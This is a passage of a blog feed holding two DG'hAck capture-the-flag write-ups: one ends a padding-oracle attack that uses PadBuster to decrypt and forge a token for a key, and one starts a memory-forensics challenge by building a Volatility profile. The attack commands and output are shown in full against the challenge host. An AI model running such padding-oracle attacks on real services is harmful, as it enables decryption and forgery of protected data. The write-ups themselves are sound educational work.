&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> SHA3-384
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Skein-512&lt;span style="color:#f92672">(&lt;/span>384&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Skein-1024&lt;span style="color:#f92672">(&lt;/span>384&lt;span style="color:#f92672">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>SHA-384 doesn&amp;rsquo;t seem to be vulnerable to any kind of interesting vulnerabilities.. Trying to base64 decode it works, but spits out unrecognizable bytes:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ base64 -d &lt;span style="color:#f92672">&amp;lt;&amp;lt;&amp;lt;&lt;/span> f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90
ï¿½|ï¿½ï¿½ï¿½mï¿½ï¿½mï¿½_ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Õ¾5&lt;span style="color:#f92672">}&lt;/span>ï¿½ï¿½ï¿½ï¿½ï¿½&lt;span style="color:#f92672">{&lt;/span>Nï¿½ï¿½ï¿½ï¿½kFï¿½ï¿½ï¿½ï¿½ï¿½^ï¿½ï¿½8ï¿½W&lt;span style="color:#f92672">=&lt;/span>Û¯&lt;span style="color:#f92672">}&lt;/span>ï¿½wï¿½ï¿½Æï¿½ï¿½ï¿½ï¿½fï¿½ï¿½ï¿½ï¿½yï¿½t%
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now an interesting thing is that if the hash is slightly modified, for example by switching the &lt;code>f&lt;/code> with an &lt;code>a&lt;/code>, we get an error:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">{
&lt;span style="color:#f92672">&amp;#34;ssn&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;!-78-67-78-356-789-12&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;success&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">false&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;message&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;le numÃ©ro de sÃ©curitÃ© sociale soumis est invalide&amp;#34;&lt;/span>
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The SSN changed! Let&amp;rsquo;s try another modification:&lt;/p>
&lt;pre>&lt;code>Internal Server Error
&lt;/code>&lt;/pre>&lt;p>And we have an error 500. This &lt;em>should&lt;/em> make us think of an &lt;a href="https://blog.skullsecurity.org/2013/padding-oracle-attacks-in-depth">oracle padding attack&lt;/a>: we know if the hash padding is correct or not when modifying it, since it causes an error. It works independently of the cipher that is used.&lt;/p>
&lt;p>There are multiple scripts available to exploit this vulnerability, we&amp;rsquo;ll use &lt;a href="https://github.com/AonCyberLabs/PadBuster">PadBuster&lt;/a>. We need to give it a few informations:&lt;/p>
&lt;ul>
&lt;li>the error string (or just let it use status codes)&lt;/li>
&lt;li>the authentication headers&lt;/li>
&lt;li>the URL&lt;/li>
&lt;li>the hash we&amp;rsquo;re trying to attack&lt;/li>
&lt;li>the block size&lt;/li>
&lt;li>the encoding of the hash&lt;/li>
&lt;/ul>
&lt;p>We&amp;rsquo;ll set the encoding to &lt;code>1&lt;/code>, for lowercase hex, and the block size (after a bit of trial and error) to 16.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ perl padBuster.pl -error &lt;span style="color:#e6db74">&amp;#39;Internal Server Error&amp;#39;&lt;/span> -header &lt;span style="color:#e6db74">&amp;#39;authorization::Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjpbeyJpZCI6MX1dLCJpYXQiOjE2MDY3MTM1OTksImV4cCI6MTYwNjg4NjM5OX0.iaQaAM73Zq61fFIaCtqBFCPQiA9M42f-2Z71gWQ2jbU&amp;#39;&lt;/span> http://sadcrypto.chall.malicecyber.com/api/v1/keygen/f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90 f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90 &lt;span style="color:#ae81ff">16&lt;/span> -encoding &lt;span style="color:#ae81ff">1&lt;/span>
+-------------------------------------------+
| PadBuster - v0.3.3 |
| Brian Holyfield - Gotham Digital Science |
| labs@gdssecurity.com |
+-------------------------------------------+
INFO: The original request returned the following
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Status: &lt;span style="color:#ae81ff">200&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Location: N/A
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Content Length: &lt;span style="color:#ae81ff">103&lt;/span>
INFO: Starting PadBuster Decrypt Mode
*** Starting Block &lt;span style="color:#ae81ff">1&lt;/span> of &lt;span style="color:#ae81ff">2&lt;/span> ***
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>137/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 16&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>204/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 15&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>252/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 14&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>225/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 13&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>187/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 12&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>146/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 11&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>62/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 10&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>156/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 9&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>133/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 8&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>125/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 7&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>57/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 6&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>102/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 5&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>125/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 4&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>83/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 3&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>6/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 2&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>39/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 1&lt;span style="color:#f92672">]&lt;/span>
Block &lt;span style="color:#ae81ff">1&lt;/span> Results:
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Cipher Text &lt;span style="color:#f92672">(&lt;/span>HEX&lt;span style="color:#f92672">)&lt;/span>: fdb2673ae06987a3a0b3644d9e1e46c4
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Intermediate Bytes &lt;span style="color:#f92672">(&lt;/span>HEX&lt;span style="color:#f92672">)&lt;/span>: c9f5a38e96cc89726cc568401b073676
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Plain Text: 1-78-67-78-356-7
Use of uninitialized value $plainTextBytes in concatenation &lt;span style="color:#f92672">(&lt;/span>.&lt;span style="color:#f92672">)&lt;/span> or string at padBuster.pl line 361.
*** Starting Block &lt;span style="color:#ae81ff">2&lt;/span> of &lt;span style="color:#ae81ff">2&lt;/span> ***
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>50/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 16&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>177/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 15&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>234/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 14&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>111/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 13&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>189/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 12&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>151/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 11&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>65/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 10&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>93/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 9&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>95/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 8&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>122/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 7&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>151/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 6&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>34/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 5&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>250/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 4&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>188/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 3&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>124/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 2&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>43/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 1&lt;span style="color:#f92672">]&lt;/span>
Block &lt;span style="color:#ae81ff">2&lt;/span> Results:
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Cipher Text &lt;span style="color:#f92672">(&lt;/span>HEX&lt;span style="color:#f92672">)&lt;/span>: 81c9269993ea9cad943862a197bbeb90
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Intermediate Bytes &lt;span style="color:#f92672">(&lt;/span>HEX&lt;span style="color:#f92672">)&lt;/span>: c58b4a0bd2628ca8abb86f4695154dcf
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Plain Text: 89-12
-------------------------------------------------------
** Finished ***
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Decrypted value &lt;span style="color:#f92672">(&lt;/span>ASCII&lt;span style="color:#f92672">)&lt;/span>: 1-78-67-78-356-789-12
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Decrypted value &lt;span style="color:#f92672">(&lt;/span>HEX&lt;span style="color:#f92672">)&lt;/span>: 312D37382D36372D37382D3335362D3738392D31320B0B0B0B0B0B0B0B0B0B0B
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Decrypted value &lt;span style="color:#f92672">(&lt;/span>Base64&lt;span style="color:#f92672">)&lt;/span>: MS03OC02Ny03OC0zNTYtNzg5LTEyCwsLCwsLCwsLCws&lt;span style="color:#f92672">=&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And it worked! The plaintext was the SSN. Now we just have to encrypt our number:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ perl padBuster.pl -error &lt;span style="color:#e6db74">&amp;#39;Internal Server Error&amp;#39;&lt;/span> -header &lt;span style="color:#e6db74">&amp;#39;authorization::Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjpbeyJpZCI6MX1dLCJpYXQiOjE2MDY3MTM1OTksImV4cCI6MTYwNjg4NjM5OX0.iaQaAM73Zq61fFIaCtqBFCPQiA9M42f-2Z71gWQ2jbU&amp;#39;&lt;/span> http://sadcrypto.chall.malicecyber.com/api/v1/keygen/f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90 f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90 &lt;span style="color:#ae81ff">16&lt;/span> -encoding &lt;span style="color:#ae81ff">1&lt;/span> -plaintext &lt;span style="color:#e6db74">&amp;#39;1-46-85-30-750-318-37&amp;#39;&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>...&lt;span style="color:#f92672">]&lt;/span>
-------------------------------------------------------
** Finished ***
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Encrypted value is: 2d9d7a71a15312fcf41424dfa18129a37e785ffbb0491d6c95f4de4095356ede00000000000000000000000000000000
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s try to exchange our hash for a decryption key:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl -H &lt;span style="color:#e6db74">&amp;#39;authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjpbeyJpZCI6MX1dLCJpYXQiOjE2MDY3MTM1OTksImV4cCI6MTYwNjg4NjM5OX0.iaQaAM73Zq61fFIaCtqBFCPQiA9M42f-2Z71gWQ2jbU&amp;#39;&lt;/span> http://sadcrypto.chall.malicecyber.com/api/v1/keygen/2d9d7a71a15312fcf41424dfa18129a37e785ffbb0491d6c95f4de4095356ede00000000000000000000000000000000 | jq
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;success&amp;#34;&lt;/span>: true,
&lt;span style="color:#e6db74">&amp;#34;message&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;hash&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;2ed35bfd91f07094b4447deac135cb8d4b6e45a69cf7a59a65b5f1ca35698e58&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And we just have to format it as the webapp does to get the flag: &lt;code>2ed35b-fd91f07094b4447deac135cb8d4b6e45&lt;/code>.&lt;/p>
&lt;hr>
&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: Shadowmallet</title><link>https://nicolasb.fr/blog/writeup-dghack-shadowmallet/</link><pubDate>Sat, 28 Nov 2020 06:44:23 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-shadowmallet/</guid><description>This challenge starts with a file called shadowmallet. We&amp;rsquo;re asked to help an administrator whose server detected an abnormal activity.
The file command doesn&amp;rsquo;t give us anything:
$ file shadowmallet shadowmallet: data But searching for the first few bytes (53ff 00f0 53ff 00f0 53ff 00f0 53ff 00f0) of the file online quickly reveals it&amp;rsquo;s a memory dump. Let&amp;rsquo;s use volatility!
$ volatility -f shadowmallet imageinfo Volatility Foundation Volatility Framework 2.6.1 INFO : volatility.</description><content>&lt;p>This challenge starts with a file called &lt;code>shadowmallet&lt;/code>. We&amp;rsquo;re asked to help an administrator whose server detected an abnormal activity.&lt;/p>
&lt;p>The &lt;code>file&lt;/code> command doesn&amp;rsquo;t give us anything:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ file shadowmallet
shadowmallet: data
&lt;/code>&lt;/pre>&lt;/div>&lt;p>But searching for the first few bytes (&lt;code>53ff 00f0 53ff 00f0 53ff 00f0 53ff 00f0&lt;/code>) of the file online quickly reveals it&amp;rsquo;s a memory dump. Let&amp;rsquo;s use volatility!&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ volatility -f shadowmallet imageinfo
Volatility Foundation Volatility Framework 2.6.1
INFO : volatility.debug : Determining profile based on KDBG search...
Suggested Profile&lt;span style="color:#f92672">(&lt;/span>s&lt;span style="color:#f92672">)&lt;/span> : No suggestion &lt;span style="color:#f92672">(&lt;/span>Instantiated with Linuxdebiancustomx64&lt;span style="color:#f92672">)&lt;/span>
AS Layer1 : FileAddressSpace &lt;span style="color:#f92672">(&lt;/span>/home/vivescere/Projects/dghack/shadow-mallet/shadowmallet&lt;span style="color:#f92672">)&lt;/span>
PAE type : No PAE
DTB : -0x1L
&lt;/code>&lt;/pre>&lt;/div>&lt;p>No dice with the default profiles. We&amp;rsquo;ll have to create a custom one.&lt;/p>
&lt;h2 id="creating-the-profile">Creating the profile&lt;/h2>
&lt;p>First, let&amp;rsquo;s find out the linux version (I guessed that it was a linux machine):&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ strings shadowmallet | grep -i &lt;span style="color:#e6db74">&amp;#39;linux version&amp;#39;&lt;/span>
&lt;span style="color:#ae81ff">0045&lt;/span> Raptor 4000-L &lt;span style="color:#f92672">[&lt;/span>Linux version&lt;span style="color:#f92672">]&lt;/span>
004a Raptor 4000-LR-L &lt;span style="color:#f92672">[&lt;/span>Linux version&lt;span style="color:#f92672">]&lt;/span>
Nov &lt;span style="color:#ae81ff">9&lt;/span> 17:30:13 contrib-buster kernel: &lt;span style="color:#f92672">[&lt;/span> 0.000000&lt;span style="color:#f92672">]&lt;/span> Linux version 4.19.0-9-amd64 &lt;span style="color:#f92672">(&lt;/span>debian-kernel@lists.debian.org&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 8.3.0 &lt;span style="color:#f92672">(&lt;/span>Debian 8.3.0-6&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#1 SMP Debian 4.19.118-2 (2020-04-29)&lt;/span>
Nov &lt;span style="color:#ae81ff">9&lt;/span> 17:30:13 contrib-buster kernel: &lt;span style="color:#f92672">[&lt;/span> 0.000000&lt;span style="color:#f92672">]&lt;/span> Linux version 4.19.0-9-amd64 &lt;span style="color:#f92672">(&lt;/span>debian-kernel@lists.debian.org&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 8.3.0 &lt;span style="color:#f92672">(&lt;/span>Debian 8.3.0-6&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#1 SMP Debian 4.19.118-2 (2020-04-29)&lt;/span>
Nov &lt;span style="color:#ae81ff">9&lt;/span> 17:30:13 contrib-buster kernel: &lt;span style="color:#f92672">[&lt;/span> 0.000000&lt;span style="color:#f92672">]&lt;/span> Linux version 4.19.0-9-amd64 &lt;span style="color:#f92672">(&lt;/span>debian-kernel@lists.debian.org&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 8.3.0 &lt;span style="color:#f92672">(&lt;/span>Debian 8.3.0-6&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#1 SMP Debian 4.19.118-2 (2020-04-29)&lt;/span>
Raptor 4000-L &lt;span style="color:#f92672">[&lt;/span>Linux version&lt;span style="color:#f92672">]&lt;/span>
Raptor 4000-LR-L &lt;span style="color:#f92672">[&lt;/span>Linux version&lt;span style="color:#f92672">]&lt;/span>
Linux version 4.19.0-9-amd64 &lt;span style="color:#f92672">(&lt;/span>debian-kernel@lists.debian.org&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 8.3.0 &lt;span style="color:#f92672">(&lt;/span>Debian 8.3.0-6&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#1 SMP Debian 4.19.118-2 (2020-04-29)&lt;/span>
Linux version 4.19.0-9-amd64 &lt;span style="color:#f92672">(&lt;/span>debian-kernel@lists.debian.org&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 8.3.0 &lt;span style="color:#f92672">(&lt;/span>Debian 8.3.0-6&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#1 SMP Debian 4.19.118-2 (2020-04-29)&lt;/span>
SWIMS: Linux Version: %04X
MESSAGE&lt;span style="color:#f92672">=&lt;/span>Linux version 4.19.0-9-amd64 &lt;span style="color:#f92672">(&lt;/span>debian-kernel@lists.debian.org&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 8.3.0 &lt;span style="color:#f92672">(&lt;/span>Debian 8.3.0-6&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#1 SMP Debian 4.19.118-2 (2020-04-29)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now, finding the right image is a bit tricky. I tried three ISOs before finally finding the right one. At first, seeing &lt;code>Debian 8.3.0-6&lt;/code>. I thought that it was a Debian 8 machine. But this is the version of debian on which gcc was compiled.&lt;/p>
&lt;p>To find the right ISO, you had to notice:&lt;/p>
&lt;ul>
&lt;li>&lt;code>contrib-buster&lt;/code>, Buster being the codename for Debian 10&lt;/li>
&lt;li>&lt;code>2020-04-29&lt;/code>, which gives a pretty good hint about what version to use&lt;/li>
&lt;/ul>
&lt;p>Here are the available Buster images:&lt;/p>
&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/shadowmallet-isos.png">&lt;img src="https://nicolasb.fr/assets/dghack/shadowmallet-isos.png" alt="The list of Debian 10 isos">&lt;/a>&lt;/p>
&lt;p>The closest one to the date is debian 10.4.0, which is the image we&amp;rsquo;re going to use. The next step is to download &lt;a href="https://cdimage.debian.org/mirror/cdimage/archive/10.4.0-live/amd64/iso-hybrid/debian-live-10.4.0-amd64-standard.iso">the ISO (live version)&lt;/a>, boot it in a VM, and generate the profile:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ sudo su
&lt;span style="color:#75715e"># We can check that we have the right version&lt;/span>
$ dmesg | head -n &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#f92672">[&lt;/span> 0.000000&lt;span style="color:#f92672">]&lt;/span> Linux version 4.19.0-9-amd64 &lt;span style="color:#f92672">(&lt;/span>debian-kernel@lists.debian.org&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 8.3.0 &lt;span style="color:#f92672">(&lt;/span>Debian 8.3.0-6&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#1 SMP Debian 4.19.118-2 (2020-04-29)&lt;/span>
&lt;span style="color:#75715e"># And then generate the profile&lt;/span>
$ apt install volatility-tools build-essential zip
$ cd /usr/src/volatility-tools/linux
$ make
$ zip debian_custom.zip module.dwarf /boot/System.map-4.19.0-9-amd64
&lt;/code>&lt;/pre>&lt;/div>&lt;p>After getting the profile back to our host system, we have to load it:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ cp debian_custom.zip /usr/lib/python2.7/site-packages/volatility/plugins/overlays/linux/debiancustom.zip
$ volatility --info | grep debian
Volatility Foundation Volatility Framework 2.6.1
